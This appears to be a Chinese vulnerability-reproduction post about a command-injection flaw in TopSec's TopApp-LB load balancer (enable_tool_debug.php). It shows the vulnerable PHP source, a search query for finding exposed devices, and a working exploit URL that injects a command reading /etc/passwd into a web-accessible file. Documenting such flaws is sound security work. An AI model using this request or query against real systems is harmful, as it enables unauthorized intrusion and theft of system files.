---
title: "天融信 TopApp-LB enable_tool_debug.php 远程命令执行漏洞"
date: 2026-10-16 09:10:32
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "天融信"
tags:
  - "天融信"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

天融信 TopSec-LB enable_tool_debug.php文件存在 远程命令执行漏洞，通过命令拼接攻击者可以执行任意命令

## 漏洞影响

```
天融信 TopSec-LB
```

## 网络测绘

```
app="天融信-TopApp-LB-负载均衡系统"
<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">
## 漏洞复现

登录页面如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091923792.png)



漏洞文件为 **enable_tool_debug.php**



```php
&lt;?php
require_once dirname(__FILE__)."/../common/commandWrapper.inc";
error_reporting(E_ALL ^ E_WARNING ^ E_NOTICE);
$val = &#36;_GET['val'];
$tool = &#36;_GET['tool'];
$par = &#36;_GET['par'];
runTool($val,$tool,$par);
?&gt;</code></pre>

</details>



**commandWrapper.inc** 文件中的 **runTool**



<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-php">function runTool($val,$tool,$par){
	if($val=="0"){
		UciUtil::setValue('system', 'runtool', 'tool', $tool);
		UciUtil::setValue('system', 'runtool', 'parameter', $par);
		UciUtil::commit('system');
		if($tool=="1"){
			&#101;xec('ping '.$par.'&gt;/tmp/tool_result &amp;');
		}else if($tool=="2"){
			&#101;xec('traceroute '.$par.'&gt;/tmp/tool_result &amp;');
		}
	}else if($val=="1"){
		$tool=UciUtil::getValue('system', 'runtool', 'tool');
		if($tool=="1"){
			&#101;xec('killall ping ');
		}else if($tool=="2"){
			&#101;xec('killall traceroute ');
		}
		UciUtil::setValue('system', 'runtool', 'tool', '');
		UciUtil::setValue('system', 'runtool', 'parameter', '');
		UciUtil::commit('system');
		&#101;xec('echo ""&gt;/tmp/tool_result');
	}
	
}</code></pre>

</details>



这里设置 var=0，tool=1，再进行命令拼接造成远程命令执行



```plain
/acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1' | cat /etc/passwd > ../../test.txt |'
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091941884.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-enable_tool_debug.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
